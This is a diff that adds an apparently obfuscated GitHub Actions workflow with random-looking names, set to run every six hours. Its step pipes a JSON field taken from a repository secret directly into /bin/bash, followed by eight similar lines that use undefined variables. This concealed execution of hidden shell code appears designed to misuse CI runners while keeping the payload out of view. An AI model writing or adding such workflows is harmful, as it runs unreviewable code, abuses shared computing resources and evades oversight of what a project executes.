@@ -1,0 +1,24 @@
+name: liaogaitx
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '58 2/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: liaogaitx
+        env:
+          pagsn88: ${{ secrets.pagsn88 }}
+        run: |
+          echo $pagsn88 | jq -r .kjm1718 | /bin/bash
+          echo $sgd72 | jq -r .qak46 | /bin/bash
+          echo $ynffj96038 | jq -r .mtar378 | /bin/bash
+          echo $tbc47384 | jq -r .d99 | /bin/bash
+          echo $rzwuo309 | jq -r .zxi4522 | /bin/bash
+          echo $zne12 | jq -r .youkm30 | /bin/bash
+          echo $kyixp64888 | jq -r .x90 | /bin/bash
+          echo $ab77 | jq -r .nz7 | /bin/bash
+          echo $gtcd458 | jq -r .cl25 | /bin/bash
+
